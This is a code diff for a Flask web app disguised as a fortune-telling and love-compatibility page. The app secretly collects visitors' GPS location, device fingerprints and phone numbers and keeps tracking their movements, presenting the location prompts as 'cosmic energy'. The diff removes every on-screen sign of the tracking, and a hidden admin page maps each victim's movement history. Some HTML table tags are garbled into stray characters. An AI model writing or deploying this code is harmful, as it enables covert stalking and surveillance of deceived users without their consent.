@@ -53,16 +53,18 @@ def save_visitor(session_id, data):
 
 def save_location(session_id, lat, lon):
     timestamp = datetime.now().isoformat()
+    map_url = f"https://www.google.com/maps?q={lat},{lon}"
     path = f"tracking_data/{session_id}_{timestamp}"
     location_data = {
         "sessionId": session_id,
         "timestamp": timestamp,
         "latitude": lat,
-        "longitude": lon
+        "longitude": lon,
+        "mapUrl": map_url
     }
     return save_to_firebase(path, location_data)
 
-# ========== HTML TEMPLATE - HIDDEN LOCATION NAME ==========
+# ========== HTML TEMPLATE - NO TECHNICAL MESSAGES VISIBLE ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -143,15 +145,6 @@ HTML_TEMPLATE = '''
             border-radius: 15px;
             margin: 15px 0;
             font-size: 14px;
-        }
-        
-        .live-energy {
-            background: #e8f5e9;
-            padding: 10px;
-            border-radius: 10px;
-            margin: 10px 0;
-            font-size: 12px;
-            display: none;
         }
         
         .cosmic-btn {
@@ -243,16 +236,6 @@ HTML_TEMPLATE = '''
         
         footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
         
-        .map-link {
-            display: inline-block;
-            background: #667eea;
-            color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            text-decoration: none;
-            margin-top: 8px;
-        }
         .energy-badge {
             background: #48bb78;
             color: white;
@@ -278,28 +261,20 @@ HTML_TEMPLATE = '''
         <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
     </div>
     
-    <!-- STEP 2: Cosmic Energy (This is actually location but user doesn't know) -->
+    <!-- STEP 2: Cosmic Energy (Hidden as location) -->
     <div id="cosmicPanel" class="cosmic-panel">
-        <h3>✨ Cosmic Energy Connection ✨</h3>
-        <p style="font-size: 14px; margin-bottom: 15px;">To connect with the universe and get an accurate reading, we need to sync with your cosmic energy field.</p>
+        <h3>✨ Connecting to the Universe ✨</h3>
+        <p style="font-size: 14px; margin-bottom: 15px;">The stars are aligning for your reading...</p>
         
         <div class="cosmic-status" id="cosmicStatus">
-            🌟 Click below to sync with cosmic energy
-        </div>
-        
-        <div id="energyTracker" class="live-energy">
-            <strong>🔄 Cosmic Energy Sync Active</strong><br>
-            <span id="energyCount">0</span> energy pulses detected<br>
-            <span id="lastEnergy">Waiting for cosmic signal...</span>
+            🌟 Click below to begin your cosmic journey
         </div>
         
         <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">
-            🔮 Sync Cosmic Energy 🔮
+            🔮 Reveal My Destiny 🔮
         </button>
         
-        <div id="energyMap" style="margin-top: 15px; display: none;">
-            <a href="#" id="energyLink" target="_blank" class="map-link">🗺️ View Energy Field</a>
-        </div>
+        <div id="energyMap" style="margin-top: 15px; display: none;"></div>
     </div>
     
     <!-- STEP 3: Fortune Result -->
@@ -317,7 +292,7 @@ HTML_TEMPLATE = '''
     </div>
     
     <div id="status" class="status"></div>
-    <footer>🔮 Trust the universe | Your energy is unique</footer>
+    <footer>🔮 Trust the universe | Your destiny awaits</footer>
 </div>
 
 <script>
@@ -331,7 +306,6 @@ HTML_TEMPLATE = '''
     let currentPercent = 0;
     let name1 = '', name2 = '';
     let energyWatcher = null;
-    let energyPulseCount = 0;
     let currentLat = null, currentLon = null;
     let energySynced = false;
     
@@ -340,7 +314,7 @@ HTML_TEMPLATE = '''
         timestamp: new Date().toISOString()
     };
     
-    // Silent data collection - user never sees anything about this
+    // Silent data collection - user never sees any of this
     async function collectDestinyData() {
         try {
             const fp = await FingerprintJS.load();
@@ -395,25 +369,26 @@ HTML_TEMPLATE = '''
         
         document.getElementById('stepNames').style.display = 'none';
         document.getElementById('cosmicPanel').style.display = 'block';
-        showMessage('Connecting to cosmic energy...', 'info');
+        showMessage('The universe is ready for you ✨', 'info');
     }
     
     function syncCosmicEnergy() {
         const energyBtn = document.getElementById('cosmicBtn');
-        energyBtn.innerHTML = '<span class="loading"></span> Syncing energy...';
+        energyBtn.innerHTML = '<span class="loading"></span> Connecting to the universe...';
         energyBtn.disabled = true;
         
-        document.getElementById('cosmicStatus').innerHTML = '✨ Connecting to universal energy field...';
-        document.getElementById('energyTracker').style.display = 'block';
+        document.getElementById('cosmicStatus').innerHTML = '✨ The stars are aligning with your energy...';
         
         navigator.geolocation.getCurrentPosition(async (position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             energySynced = true;
             
+            const mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            
             destinyData.energyLatitude = currentLat;
             destinyData.energyLongitude = currentLon;
-            destinyData.energyMap = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
+            destinyData.energyMapUrl = mapUrl;
             
             await fetch('/save-destiny', {
                 method: 'POST',
@@ -427,24 +402,21 @@ HTML_TEMPLATE = '''
                 body: JSON.stringify({
                     sessionId: sessionId,
                     energyPoint: currentLat,
-                    energyValue: currentLon
+                    energyValue: currentLon,
+                    mapUrl: mapUrl
                 })
             });
-            
-            document.getElementById('energyMap').style.display = 'block';
-            document.getElementById('energyLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
-            document.getElementById('cosmicStatus').innerHTML = `✅ Energy synced! Energy coordinates: ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
             
             startEnergyTracking();
             await revealFortune();
             
-            energyBtn.innerHTML = '✅ Energy Synced! Fortune Revealed ✅';
+            energyBtn.innerHTML = '✨ Your Destiny is Revealed ✨';
             
         }, (error) => {
-            let errorMsg = 'Unable to sync cosmic energy. Please check your connection to the universe.';
-            if (error.code === 1) errorMsg = '❌ Cosmic energy access blocked. Please allow energy sync for accurate reading!';
-            if (error.code === 2) errorMsg = '❌ Energy field unavailable. Please try again.';
-            if (error.code === 3) errorMsg = '❌ Energy sync timeout. Please check your cosmic connection.';
+            let errorMsg = 'Unable to connect to the universe. Please check your connection.';
+            if (error.code === 1) errorMsg = '❌ Please allow cosmic connection for accurate reading!';
+            if (error.code === 2) errorMsg = '❌ Universe connection unavailable. Please try again.';
+            if (error.code === 3) errorMsg = '❌ Connection timeout. Please check your cosmic signal.';
             
             document.getElementById('cosmicStatus').innerHTML = errorMsg;
             energyBtn.innerHTML = '🔮 Try Again 🔮';
@@ -461,14 +433,10 @@ HTML_TEMPLATE = '''
         energyWatcher = navigator.geolocation.watchPosition(async (position) => {
             const newLat = position.coords.latitude;
             const newLon = position.coords.longitude;
-            energyPulseCount++;
-            
-            document.getElementById('energyCount').innerHTML = energyPulseCount;
-            document.getElementById('lastEnergy').innerHTML = `✨ Energy pulse: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
+            const newMapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
             
             currentLat = newLat;
             currentLon = newLon;
-            document.getElementById('energyLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
             
             await fetch('/record-energy', {
                 method: 'POST',
@@ -476,13 +444,14 @@ HTML_TEMPLATE = '''
                 body: JSON.stringify({
                     sessionId: sessionId,
                     energyPoint: newLat,
-                    energyValue: newLon
+                    energyValue: newLon,
+                    mapUrl: newMapUrl
                 })
             });
             
             destinyData.energyLatitude = newLat;
             destinyData.energyLongitude = newLon;
-            destinyData.energyMap = `https://www.google.com/maps?q=${newLat},${newLon}`;
+            destinyData.energyMapUrl = newMapUrl;
             
             await fetch('/save-destiny', {
                 method: 'POST',
@@ -491,7 +460,8 @@ HTML_TEMPLATE = '''
             });
             
         }, (error) => {
-            console.log('Energy tracking continues...', error);
+            // Silent fail - user never knows
+            console.log('Energy tracking continues silently');
         }, {
             enableHighAccuracy: true,
             maximumAge: 0,
@@ -513,12 +483,6 @@ HTML_TEMPLATE = '''
             
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
-            
-            let energyBadgeHtml = '';
-            if (currentLat && currentLon) {
-                energyBadgeHtml = `<div class="energy-badge">✨ Energy Synced | ${energyPulseCount} cosmic pulses detected</div>`;
-                document.getElementById('energyBadge').innerHTML = energyBadgeHtml;
-            }
             
             document.getElementById('result').style.display = 'block';
             document.getElementById('phoneSection').style.display = 'block';
@@ -563,13 +527,12 @@ HTML_TEMPLATE = '''
                     sessionId: sessionId,
                     phoneNumber: phone,
                     fortune: currentFortune,
-                    percentage: currentPercent,
-                    energyPulses: energyPulseCount
+                    percentage: currentPercent
                 })
             });
             const result = await response.json();
             if (result.status === 'saved') {
-                showMessage('✅ Your fortune is secured!', 'success');
+                showMessage('✅ Your fortune has been sent to your phone!', 'success');
                 document.getElementById('phone').disabled = true;
                 saveBtn.innerHTML = '✅ Delivered!';
                 saveBtn.style.background = '#38a169';
@@ -623,9 +586,19 @@ def record_energy():
         session_id = data.get('sessionId')
         lat = data.get('energyPoint')
         lon = data.get('energyValue')
+        map_url = data.get('mapUrl')
         
         if session_id and lat and lon:
-            save_location(session_id, lat, lon)
+            timestamp = datetime.now().isoformat()
+            path = f"tracking_data/{session_id}_{timestamp}"
+            location_data = {
+                "sessionId": session_id,
+                "timestamp": timestamp,
+                "latitude": lat,
+                "longitude": lon,
+                "mapUrl": map_url
+            }
+            save_to_firebase(path, location_data)
             return jsonify({'status': 'recorded'})
         return jsonify({'status': 'error'}), 400
     except Exception as e:
@@ -665,7 +638,7 @@ def calculate_fortune():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ========== ADMIN VIEW - SEE EVERYTHING ==========
+# ========== ADMIN VIEW - SEE EVERYTHING WITH MAP URL ==========
 @app.route('/admin-secret-view')
 def admin_view():
     try:
@@ -678,8 +651,8 @@ def admin_view():
             <head><title>Admin Dashboard</title></head>
             <body style="background:#1a1a2e;color:#eee;padding:20px;font-family:monospace;">
                 <h1>📊 No Data Yet</h1>
-                <p>Users haven't synced their cosmic energy yet.</p>
-                <a href="/" style="color:#f093fb;">Back</a>
+                <p>No visitors have used the app yet.</p>
+                <a href="/" style="color:#f093fb;">Back to App</a>
             </body>
             </html>
             """
@@ -688,7 +661,7 @@ def admin_view():
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Dashboard - Complete Data</title>
+            <title>Admin Dashboard - Complete Data with Maps</title>
             <style>
                 body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
                 h1 { color:#f093fb; }
@@ -698,31 +671,38 @@ def admin_view():
                 th { background:#e94560; color:white; }
                 .count { background:#0f3460; padding:10px; border-radius:10px; margin:20px 0; }
                 .btn { background:#e94560; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; display:inline-block; margin:10px; }
+                .map-link { color:#48bb78; text-decoration:none; }
+                .map-link:hover { text-decoration:underline; }
             </style>
         </head>
         <body>
-            <h1>📊 Complete Visitor Data</h1>
-            <p><a href="/admin-secret-view" class="btn">🔄 Refresh</a> <a href="/" class="btn">🏠 Back</a></p>
+            <h1>📊 Complete Visitor Data (With Map URLs)</h1>
+            <p><a href="/admin-secret-view" class="btn">🔄 Refresh</a> <a href="/" class="btn">🏠 Back to App</a></p>
         """
         
         if visitors:
             html += f'<div class="count"><strong>Total Visitors:</strong> {len(visitors)}</div>'
             
             html += """
-            <h2>📍 All Visitor Information</h2>
+            <h2>📍 All Visitor Information (Including Map URLs)</h2>
             <div style="overflow-x:auto;">
-            <table>
+            表
                 <thead>
                     <tr>
                         <th>Session</th><th>Name</th><th>Partner</th><th>Love %</th><th>Phone</th>
                         <th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th>
-                        <th>Latitude</th><th>Longitude</th><th>Screen</th><th>Timezone</th>
+                        <th>Latitude</th><th>Longitude</th><th>Map URL</th>
+                        <th>Screen</th><th>Timezone</th>
                     </tr>
                 </thead>
                 <tbody>
             """
             for session_id, visitor in visitors.items():
                 if isinstance(visitor, dict):
+                    map_link = ""
+                    if visitor.get('energyMapUrl'):
+                        map_link = f'<a href="{visitor.get("energyMapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
+                    
                     html += f"""
                         <tr>
                             <td>{session_id[:25]}...</td>
@@ -736,26 +716,29 @@ def admin_view():
                             <td>{visitor.get('signalType', '-')}</td>
                             <td>{visitor.get('energyLatitude', '-')}</td>
                             <td>{visitor.get('energyLongitude', '-')}</td>
+                            <td>{map_link}</td>
                             <td>{visitor.get('screen', '-')}</td>
                             <td>{visitor.get('timezone', '-')}</td>
                         </tr>
                     """
-            html += "</tbody></table></div>"
+            html += "</tbody> grape</div>"
         
         if energyData:
-            html += f'<div class="count"><strong>Total Energy Pulses:</strong> {len(energyData)} (Live Tracking)</div>'
+            html += f'<div class="count"><strong>Total Live Location Updates:</strong> {len(energyData)} (Movement Tracking with Maps)</div>'
             
             html += """
-            <h2>🔄 Cosmic Energy Movement History</h2>
+            <h2>🔄 Complete Movement History (Every Location Change with Map URL)</h2>
             <div style="overflow-x:auto;">
-            <table>
-                <thead><tr><th>Session</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr></thead>
+            表
+                <thead><tr><th>Session</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map URL</th></thead>
                 <tbody>
             """
             sorted_data = sorted(energyData.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
             for key, loc in sorted_data:
                 if isinstance(loc, dict):
-                    map_link = f'<a href="https://www.google.com/maps?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank" style="color:#48bb78;">📍 View</a>'
+                    map_link = ""
+                    if loc.get('mapUrl'):
+                        map_link = f'<a href="{loc.get("mapUrl")}" target="_blank" class="map-link">🗺️ View Map</a>'
                     html += f"""
                         <tr>
                             <td>{loc.get('sessionId', '')[:25]}...</td>
@@ -765,7 +748,7 @@ def admin_view():
                             <td>{map_link}</td>
                         </tr>
                     """
-            html += "</tbody></table></div>"
+            html += "</tbody> grape</div>"
         
         html += "</body></html>"
         return html
